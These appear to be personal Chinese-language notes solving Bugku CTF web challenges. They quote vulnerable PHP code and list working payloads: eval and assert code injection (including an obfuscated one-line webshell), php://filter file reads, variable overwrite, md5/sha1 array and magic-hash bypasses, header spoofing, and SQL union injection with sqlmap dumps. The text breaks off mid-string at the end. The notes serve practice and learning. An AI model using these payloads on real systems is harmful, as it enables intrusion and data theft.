1.web2
	听说聪明的人都能找到答案
	http://123.206.87.240:8002/web2/
	CTRL + u 查看源代码

2.计算器
	http://123.206.87.240:8002/yanzhengma/
	改一下字符输入长度的限制

3.web基础$_GET
	http://123.206.87.240:8002/get/
	?var=val

4.web基础$_POST
	http://123.206.87.240:8002/get/index1.php
	直接用BurpSuite改包，注意先改为POST request

5.矛盾
	http://123.206.87.240:8002/get/index1.php
	$num = $_GET['num'];
	if(!is_numeric($num)) {
		echo $num;
		if($num == 1)  
		echo 'flag{**********}';
	}
	此处 == 为弱类型判断，num = 1e ，num == 1
	
6.web3
	flag就在这里快来找找吧
	http://123.206.87.240:8002/web3/
	直接查看源码，得&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;
	&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;
	扔到 Burp 解码试试，解为html得flag

7.域名解析
	听说把 flag.bugku.com 解析到123.206.87.240 就能拿到flag
	两种办法：1.直接改本机 host 文件
			  2.访问时将请求头中的 host 改为flag.bugku.com
	然而我两种办法都失败了，显示域名没备案，哈哈哈
	
8.你必须让他停下
	http://123.206.87.240:8002/web12/
	页面不断的自动刷新，用Burp拦截，一张图一张图看，源代码中蕴含了 flag
	
9.本地包含
	<?php 
		include "flag.php"; 
		$a = @$_REQUEST['hello'];  // @ 可屏蔽报错信息的显示
		eval( "var_dump($a);");   // eval() 漏洞
		show_source(__FILE__); 
	?>
	show_source() 对文件进行语法高亮
	hello=1);show_source('flag.php');var_dump(
	最终解释为：
	var_dump(1);show_source('flag.php');var_dump(show_source(__FILE__);
	
10.变量1
	flag In the variable ! 
	<?php  
		error_reporting(0);
		include "flag1.php";
		highlight_file(__file__);
		if(isset($_GET['args'])){
			$args = $_GET['args'];
			if(!preg_match("/^\w+$/",$args)){
				die("args error!");
			}
			eval("var_dump($$args);");
		}
	?>

	通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件

	// preg_match() 正则表达式匹配函数

	/^\w+$/

	两个//表示开始和结束
	^表示开始字符串
	$表示结束字符串
	\w表示包含【a-z，A-Z, _ , 0-9】
	+表示一个或者多个\w

	var_dump()显示一个或多个表达式的结构信息，包括表达式的类型与值。
	数组将递归展开值，通过缩进显示其结构

	eval()存在命令执行漏洞，我们是想查看flag1.php中的flag，
	首先想到的是本地包含漏洞，查看源码，或者上传一句话木马等思路
	但是条件判断加了正则表达式判断，过滤了括号和引号等字符。
	PHP 在 $GLOBALS[index] 数组中存储了所有全局变量，数组的键值为变量名

	$$args = $($args)

	$$ --> 可变变量，允许动态改变一个变量名称
	$name = "trans";
	$trans = "You can see me";
	echo $name.<br>;
	echo $$name;

	------------
	结果:
		trans
		You can see me
		
11.web5
	JSPFUCK??????答案格式CTF{**}
	http://123.206.87.240:8002/web5/
	查看源代码可得：([][(![]+[])[+[]] 这种加密过后的 js 代码，直接扔到 console 跑一下就出来
	
12.头等舱
	老办法，先看源代码，源代码还是啥也没有，看看请求头，找到了
	
13.网站被黑
	http://123.206.87.240:8002/webshell/
	这个题没技术含量但是实战中经常遇到
	扫一下后台，找到后门，Burp 爆破就看到了
	
14.管理员系统
	特别突出的是 非本地IP访问，直接改个 X-Forwarded-For:127.0.0.1，然后再爆破
	X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。
	它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。
	标准格式如下：X-Forwarded-For: client1, proxy1, proxy2
	HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，
	告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理
	
15.web4
	var p1 = ----;
	var p2 = ----;
	eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));
									// 54aa2
	function checkSubmit() {
		var a = document.getElementById("password");
		if("undefined"!=typeof a) {
			if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
				return !0;
			alert("Error");
			a.focus();
			return !1;
			}
		}
	document.getElementById("levelQuest").onsubmit=checkSubmit;
	明显发现有一段被 base64 加密过，解码可得
	
16.输入密码查看flag
	http://123.206.87.240:8002/baopo/
	目录提示使用爆破，5位数密码？？？
	纯数字！！！
	
17.点击一百万次
	var clicks=0
	$(function() {
	  $("#cookie")
		.mousedown(function() {
		  $(this).width('350px').height('350px');
		})
		.mouseup(function() {
		  $(this).width('375px').height('375px');
		  clicks++;
		  $("#clickcount").text(clicks);
		  if(clicks >= 1000000){
			var form = $('<form action="" method="post">' +
						'<input type="text" name="clicks" value="' + clicks + '" hidden/>' +
						'</form>');
						$('body').append(form);
						form.submit();
		  }
		});
	});

	观察得，若clicks >= 1000000 则执行下面的提交表单，
	索性直接 post 好了
	
18.过狗一句话
	<?php 
	$poc = "a#s#s#e#r#t"; 
	$poc_1 = explode("#",$poc);   
	// explode(separator,string,limit) 函数把字符串打散为数组
	$poc_2 = $poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
	$poc_2($_GET['s']) 
	?>
	bool assert ( mixed $assertion [, Throwable $exception ] )
	// 若assertion为字符串，则assertion将会被当做php代码执行，与eval()类似
	http://120.24.86.145:8010/?s=print_r(scandir('./'));
	print_r() 函数用于打印变量，以更容易理解的形式展示
	scandir(directory,sorting_order,context) 函数返回指定目录中的文件和目录的数组
	print_r(scandir('./'))  // 打印所有目录
	
	
# Welcome to bugku
<?php
	$user = $_GET["txt"];  
	$file = $_GET["file"];  
	$pass = $_GET["password"];  
	// file_get_contents() 把整个文件读入一个字符串中
	if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
		echo "hello admin!<br>";  
		include($file); //hint.php  
	}else{  
		echo "you are not admin ! ";  
	}  
?>
	这个题遇到很多骚办法，暂时还不会做
	https://www.leavesongs.com/PENETRATION/php-filter-magic.html
	php 伪协议	php://filter	php://input
	// ROIS恰好也有这道题，暗示我多做题？？
	// 构造序列化，注意类名 Read
	<?php
		class Read{
			public $file;
		}
		
		$a = new Read();
		$a->file = "f1a9.php";
		$a = serialize($a);
		print_r($a);
	?>
	<?php
	class Read{//f1a9.php
		public $file;
		public function __toString(){
			if(isset($this->file)){
				echo file_get_contents($this->file);    
			}
			return "__toString was called!";
		}
	}
	?>

	<?php
		$user = $_GET["user"];
		$file = $_GET["file"];
		$pass = $_GET["pass"];

		if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
			echo "hello admin!<br>";
			if(preg_match("/f1a9/",$file)){
				exit();
			}else{
				include($file); //class.php
				$pass = unserialize($pass);
				echo $pass;
			}
		}else{
			echo "you are not admin ! ";
		}
	?>

# 各种绕过
	<?php 
		highlight_file('flag.php'); 
		$_GET['id'] = urldecode($_GET['id']);   // 将URL解码
		$flag = 'flag{xxxxxxxxxxxxxxxxxx}'; 
		if (isset($_GET['uname']) and isset($_POST['passwd'])) { 
			if ($_GET['uname'] == $_POST['passwd']) 
				print 'passwd can not be uname.'; 
			else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin')) 
				die('Flag: '.$flag); 
			else 
				print 'sorry!'; 
		} 
	?>
	先将 id URL编码 %6d%61%72%67%69%6e
	再用数组绕过sha1()

# linux
	linux基础问题
	得到一个压缩包，win下打不开，扔到kali解压后发现一个flag的文件，
	改权限777，cat强行查看，发现flag，不过本意好像不是这样
	strings 命令(此命令相当牛逼，以后再仔细学)
# linux2
	同上。。
	
	
# 宽带信息泄露
	题目给的是 conf.bin 文件，.bin 相当于一个万能后缀，无法直接确定
	打开看一下是二进制文件，题目强调的是宽带信息泄露,flag{宽带用户名}
	网上提示了一个工具 Routerpassview
	
	
# Javascript Tricks
	var net = require('net');
	flag='fake_flag';
	var server = net.createServer(
		function(socket) {
			socket.on('data', (data) => { 
				//m = data.toString().replace(/[\n\r]*$/, '');
				ok = true;
				arr = data.toString().split(' ');
				arr = arr.map(Number);
				if (arr.length != 5)   // arr长度为5
					ok = false;
				arr1 = arr.slice(0);  // 抽取从0开始的所有字符
				arr1.sort();
				for (var i=0; i<4; i++)  // 没有相同元素，正常ASCII码
					if (arr1[i+1] == arr1[i] || arr[i] < 0 || arr1[i+1] > 127)
						ok = false;
				arr2 = [];
				for (var i=0; i<4; i++)
					arr2.push(arr1[i] + arr1[i+1]);
				val = 0;
				for (var i=0; i<4; i++)
					val = val * 0x100 + arr2[i];  // 0x100 = 256
				if (val != 0x23332333)
					ok = false;
				if (ok)
					socket.write(flag+'\n');
				else
					socket.write('nope\n');
			});
			//socket.write('Echo server\r\n');
			//socket.pipe(socket);
		}
	);
	HOST = '0.0.0.0'
	PORT = 8082
	server.listen(PORT, HOST); 
	
	这里还要用到 netcat 简称 nc，又涨了波姿势
	
	
# extract变量覆盖
	<?php
		$flag='xxx';
		extract($_GET);
		if(isset($shiyan)){
			$content=trim(file_get_contents($flag));
			if($shiyan==$content){
				echo'flag{xxx}';
			}
			else{
				echo'Oh.no';
			}
		}
	?>
	extract(array[,extract_rules,prefix)]  
	// 数组键名作为变量名，数组键值作为变量值
	// 后几个参数是解决新创建的变量与原变量的冲突问题的
	// 就这个题来说，之前就有一个flag的变量了，此时GET一个flag进去就会把原flag的值覆盖掉
	// 如果$flag这个文件不存在，file_get_contents($flag)将为空
	// 此时只需传一个 shiyan&flag 就解决了
						 

# strcmp比较字符串
	<?php
		$flag = "flag{xxxxx}";
		if (isset($_GET['a'])) {
			if (strcmp($_GET['a'], $flag) == 0) 
				die('Flag: '.$flag);
			else
				print 'No';
		}
	?>
	// 比较两个字符串（区分大小写）正常规则：
	   如果 str1 小于 str2 返回 < 0；如果大于返回 > 0；如果相等，返回 0。
	// 如果传入的值不是字符串类型就将出故障，并 return 0
	// 比如 传一个数组 a[] ? 这题就做完了
	

# urldecode二次编码绕过
	<?php
		if(eregi("hackerDJ",$_GET[id])) {
			echo("not allowed!");
			exit();
		}
		$_GET[id] = urldecode($_GET[id]);
		if($_GET[id] == "hackerDJ")	{
			echo "Access granted!";
			echo "flag";
		}
	?>
	int ereg(string pattern, string string, array [regs]); 区分大小写
	int eregi(string $pattern, string $string [, array &$regs]) 不区分大小写的正则表达式匹配
	题面已经给了思路，将 hackerDJ 进行二次 url 编码即可绕过
	
	
# md5()函数
	<?php
		error_reporting(0);
		$flag = 'flag{test}';
		if (isset($_GET['username']) and isset($_GET['password'])) {
			if ($_GET['username'] == $_GET['password'])
				print 'Your password can not be your username.';
			else if (md5($_GET['username']) === md5($_GET['password']))
				die('Flag: '.$flag);
			else
				print 'Invalid password';
		}
	?>
	数组大法好，直接 username[]&password[]=1又轻松绕过 md5()
	原理：md5() 不能处理数组，md5(数组) 会返回 null
	

# 数组返回NULL绕过
	<?php
		$flag = "flag";
		if (isset ($_GET['password'])) {
			if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
				echo 'You password must be alphanumeric';
			else if (strpos ($_GET['password'], '--') !== FALSE)
				die('Flag: ' . $flag);
			else
				echo 'Invalid password';
		}
	?>
	数组又能直接绕过？？ =>  password[]=1
	原理：
		ereg() 只能处理字符，传数组将返回 null，
		三个等号的时候不会进行类型转换，所以 null!==false
		strpos() 的参数同样不能是数组，返回依旧是 null，同上
		
	%00 截断：ereg()可以进行%00截断，这样就能绕开正则匹配  =>  password=1%00--
	

# 弱类型整数大小比较绕过
	<?php
		$temp = $_GET['password'];
		is_numeric($temp) ? die("no numeric") : NULL;
		if($temp>1336){
			echo $flag;
	?>
	数组又能直接绕过？？
	is_numeric()判断变量是否为数字或数字字符串
	password=1445%00 / password=1445%20
	

# sha1()函数比较绕过
	<?php
		$flag = "flag";
		if (isset($_GET['name']) and isset($_GET['password']))
		{
			var_dump($_GET['name']);
			echo "	";
			var_dump($_GET['password']);
			var_dump(sha1($_GET['name']));
			var_dump(sha1($_GET['password']));
			if ($_GET['name'] == $_GET['password'])
				echo 'Your password can not be your name!';
			else if (sha1($_GET['name']) === sha1($_GET['password']))
				die('Flag: '.$flag);
			else
				echo 'Invalid password.';
		}
		else
			echo 'Login first!';
	?>
	sha1() 计算字符串的散列值
	数组又能直接绕过？？
	sha1() 函数无法处理数组类型，将报错并返回false，false === false条件成立
	

# md5加密相等绕过
	<?php
		$md51 = md5('QNKCDZO');
		$a = @$_GET['a'];
		$md52 = @md5($a);
		if(isset($a)){
			if ($a != 'QNKCDZO' && $md51 == $md52) {
				echo "flag{*}";
			} else {
				echo "false!!!";
			}
		}
		else{
			echo "please input a";
		}
	?>
	PHP 在处理哈希字符串时，会利用 != / == 来对其进行比较，它把每个以“0e”的哈希值都解释为0。
	如果两个不同的密码经过哈希以后，哈希值都是以“0e"开头的话，PHP将认为这两个哈希值相同。

	常见的payload:
		QNKCDZO
		0e830400451993494058024219903391

		s155964671a
		0e342768416822451524974117254469

		s214587387a
		0e848240448830537924465865611904

		s878926199a
		0e545993274517709034328855841020

		s1091221200a
		0e940624217856561557816327384675

		s1885207154a
		0e509367213418206700842008763514

		s1836677006a
		0e481036490867661113260034900752

		s1184209335a
		0e072485820392773389523109082030

		s1665632922a
		0e731198061491163073197128363787

		s1502113478a
		0e861580163291561247404381396064

		s532378020a
		0e220463095855511507588041205815
		

# 十六进制与数字比较
	<?php
		error_reporting(0);
		function noother_says_correct($temp) {
			$flag = 'flag{test}';
			$one = ord('1');  //ord() 返回字符的 ASCII 码值
			$nine = ord('9');
			$number = '3735929054';
			for ($i = 0; $i < strlen($number); $i++) {
				$digit = ord($temp{$i});
				if (($digit >= $one) && ($digit <= $nine))
					return "flase";
			}
			if($number == $temp)
				return $flag;
		}
		$temp = $_GET['password'];
		echo noother_says_correct($temp);
	?>
	转十六进制 0xdeadc0de 绕过，别忘了加 0x
	
# strpos数组绕过	
	<?php
		$flag = "flag";
		if (isset ($_GET['ctf'])) {
			if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)
				echo '必须输入数字才行';
			else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
				die('Flag: '.$flag);
			else
				echo '骚年，继续努力吧啊~';
		}
	?>
	数组又能直接绕过？？ ctf[]={#BIUBIUbiu}
	
	
# ereg正则%00截断
	<?php
		$flag = "xxx";
		if (isset ($_GET['password'])) {
			if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) {
				echo 'You password must be alphanumeric';
		}
		else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999) {
			if (strpos ($_GET['password'], '*-*') !== FALSE)
				die('Flag: ' . $flag);
			else
				echo('*-* have not been found');
		}
		else
			echo 'Invalid password';
		}
	?>
	1.数组绕过：password[]
	2.%00截断，再加上科学计数法  =>  password=1e9%00*-*
	
# 数字验证正则绕过
	<?php
		error_reporting(0);
		$flag = 'flag{test}';
		if ("POST" == $_SERVER['REQUEST_METHOD']) {
			$password = $_POST['password'];
			if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password))	{
				echo 'flag';
				exit;
			}
			while (TRUE) {
				$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
				if (6 > preg_match_all($reg, $password, $arr))
					break;
				$c = 0;
				$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母
				foreach ($ps as $pt) {
					if (preg_match("/[[:$pt:]]+/", $password))
						$c += 1;
				}
				if ($c < 3) break;
				//>=3，必须包含四种类型三种与三种以上
				if ("42" == $password) echo $flag;
				else echo 'Wrong password';
				exit;
			}
		}
	?>
	直接password=就出答案了？？？我？？？
	
	
# 字符？正则？
	<?php 
		highlight_file('2.php');
		$key='KEY{********************************}';
		$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
		if( $IM ){ 
			die('key is: '.$key);
		}
	?> 
	单纯的考正则表达式，只要id成功匹配就会出flag，注意!!!最后一个是匹配任意标点符号!!!
	定界符：/和/（除了\和字母数字,其它的只要是成对出现都可以看做定界符，比如##、！！之类的）
	/i 表示忽略大小写
	id=key0key4434key:/a/aakeyb.
	忘记了最后那个标点符号，差点怀疑人生
	
	
# 程序员本地网站
	直接在请求头里添加 X-Forwarded-For:127.0.0.1
	
	
# 你从哪里来
	are you from google?
	将 refer 头修改为 https://www.google.com
	www.google.com 都不行
	http://www.google.com 都不行 :)
	
	
# login1(SKCTF)
	hint:SQL约束攻击
	先注册  user:admin                                    1
			 passwd:Abc123
	然后 用admin,Abc123也能登录上了
	[约束攻击详解](https://www.freebuf.com/articles/web/124537.html)
	
	
# md5 collision(NUPT_CTF)
	题目是MD5碰撞，直接传一个MD5以0e开头的过去
	
	
# 秋名山老司机
	亲请在2s内计算老司机的车速是多少
	每次显示一些随机的大数相加减
	我想到了py直接提交请求，然而自己独立写不出来
	import requests 
	import re 
	url = 'http://123.206.87.240:8002/qiumingshan/' 
	s = requests.Session() 
	source = s.get(url) 
	expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group() 
	result = eval(expression) 
	post = {'value': result} 
	print(s.post(url, data = post).text)
	必须利用会话对象 Session()，否则提交结果的时候，页面又重新生成一个新的表达式
	利用正则表达式截取响应内容中的算术表达式。首先引入 re 模块，其次用 search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。
	获得算术表达式的字符串后，直接利用 Python 的內建方法 eval() 来计算出结果，简单、暴力、快捷。
	
	
# web8
	txt？？？？
	<?php
		extract($_GET);
		if (!empty($ac)) {
			$f = trim(file_get_contents($fn));
			if ($ac === $f)
				echo "<p>This is flag:" ." $flag</p>";
			else
				echo "<p>sorry!</p>";
		}
	?>
	empty() 以下情况将返回TRUE
		"" (空字符串)
		0 (作为整数的0)
		0.0 (作为浮点数的0)
		"0" (作为字符串的0)
		NULL
		FALSE
		array() (一个空数组)
		$var; (一个声明了，但是没有值的变量)
	单个参数的extract()自然想到变量覆盖，然而$ac又不能为空
	扫了后台扫了个2.php，又提示txt，ac=txt& fn=2.php，结果没卵用，哈哈
	试了好几次后选择看writeup
	1.ac=flags& fn=flag.txt，这个想法真是脑洞打开
	2.利用伪协议读取post，妙极了
		ac=233 & fn=php://input
		再post一个233，齐活儿
	
	
# 前女友(SKCTF)
	<?php
		if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
			$v1 = $_GET['v1'];
			$v2 = $_GET['v2'];
			$v3 = $_GET['v3'];
			if($v1 != $v2 && md5($v1) == md5($v2)){
				if(!strcmp($v3, $flag)){
					echo $flag;
				}
			}
		}
	?>	
	md5碰撞，数组绕过strcmp()，做完了
	
	
# 速度要快
	我感觉你得快点!!!
	查看源码  =>  <!-- OK ,now you have to post the margin what you find -->
	找啊找啊，响应头里面发现了一个 flag 键名
	刷新一下还会变，flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTmpNek56RXo=
	那就上py脚本搞吧，注意建立会话对象 session(),否则已提交，flag又变了
	
	import requests
	import base64

	url = 'http://123.206.87.240:8002/web6/'
	req = requests.session()
	flag = req.get(url).headers['flag']
	flag = base64.b64decode(flag)
	print(flag)
	flag = flag.decode()  # 防止split()报错
	flag = base64.b64decode(flag.split(':')[1])  # 解码两次才变成数值
	print(flag)
	data = {'margin':flag}
	print(req.post(url,data).content)  # 此处为了看得方便可继续解码，不过没必要
	
	
// 一定要养成手动保存的好习惯，东西丢了还是很伤心的，又要重写

# cookies欺骗
	得到这么一个字符串：
	rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry
	还有一个地址：index.php?line=& filename=a2V5cy50eHQ= (keys.txt)
	直接查看keys.txt，发现还是这么一段乱七八糟的字符串
	上面那个又向一个文件包含，filename传入的还是一个base64编码，看看 aW5kZXgucGhw (index.php)
	乍一看还是什么都没有，调整一下line的参数，有点东西了，一点一点扒下来
	<?php
		error_reporting(0);
		$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
		$line=isset($_GET['line'])?intval($_GET['line']):0;
		if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
		$file_list = array('0' =>'keys.txt','1' =>'index.php',);
		if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
			$file_list[2]='keys.php';
		}
		if(in_array($file, $file_list)){
			$fa = file($file);
			echo $fa[$line];
		}
	?>
	此时改一下 cookies，margin=margin，游戏结束

	
# flag在index里
	http://123.206.87.240:8005/post/index.php?file=show.php
	既然说flag在index里，看一下index源码，?file=php://filter/read=convert.base64-encode/resource=index.php
	PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==
	
	解码一下
	<html>
    <title>Bugku-ctf</title>
  
	<?php
		error_reporting(0);
		if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
		$file=$_GET['file'];
		if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
			echo "Oh no!";
			exit();
		}
		include($file); 
	//flag:flag{edulcni_elif_lacol_si_siht}
	?>
	</html>
	
	
# 成绩单
	发现一个用 post 传 id 的输入框，注入题
	-1' union select 1,2,3,database()#
	-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#
	-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#  // 这里用16进制绕过一下
	-1' union select 1,2,3,skctf_flag from fl4g#
	
	sqlmap 也能跑出来，牛
		sqlmap -u URL --data="id=1"
		[11:01:58] [INFO] the back-end DBMS is MySQL
		back-end DBMS: MySQL >= 5.0.12
		发现后台数据库是 mysql
		
		列举所有数据库
		sqlmap -u URL --data="id=1" --dbs
		available databases [2]:
		[*] information_schema
		[*] skctf_flag
		
		爆出所有表
		sqlmap -u URL --data="id=1" -D skctf_flag --tables
		Database: skctf_flag
		[2 tables]
		+------+
		| fl4g |
		| sc   |
		+------+
		
		列出内容
		sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -T fl4g --dump 
		也可以选择全弄出来：sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag --dump
		Database: skctf_flag
		Table: fl4g
		[1 entry]
		+---------------------------------+
		| skctf_flag                      |
		+---------------------------------+
		| BUGKU{Sql_INJECT0N_4813drd8hz4} |
		+---------------------------------+
		
# 备份是个好习惯
	d41d8cd98f00b204e9800998ecf8427e
	d41d8cd98f00b204e9800998ecf8427e
	提示提到了备份，应该是备份文件源码泄漏一类的，用脚本跑下后台有没有源码 {工具在 F/CTF_tools/源码泄露}
	得到 index.php.bak
	<?php
		include_once "flag.php";
		ini_set("display_errors", 0);
		$str = strstr($_SERVER['REQUEST_URI'], '?');
		$str = substr($str,1);
		$str = str_replace('key','',$str);
		parse_str($str);
		echo md5($key1);
		echo md5($key2);
		if(md5($key1) == md5($key2) && $key1 !== $key2){
			echo $flag."取得flag";
	}
	有个替换性的过滤，用 kekeyy 就能绕过
	分析源码，有个 parse_str()，此函数与 extract() 差不多，将关联数组中的元素与变量联系起来
	那么就可以这样传值进去，kekeyy1 & kekeyy2[]
	MD5函数无法处理数组，于是可以用 kekeyy1[]=33 & kekeyy2[]=44 进行绕过
	或者直接 MD5碰撞
?>

# never give up
	查看源码，发现一个小注释:1p.html
	一打开就跳转到其他页面，拿burp抓一下，发现如下信息
	
	var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" 
	function OutWord() {
		var NewWords;
		NewWords = unescape(Words);
		document.write(NewWords);
	} 
	OutWord();
	然后一路解码，得到代码
	<script>window.location.href='http://www.bugku.com';</script> 	
	<!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==-->
	
	%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22n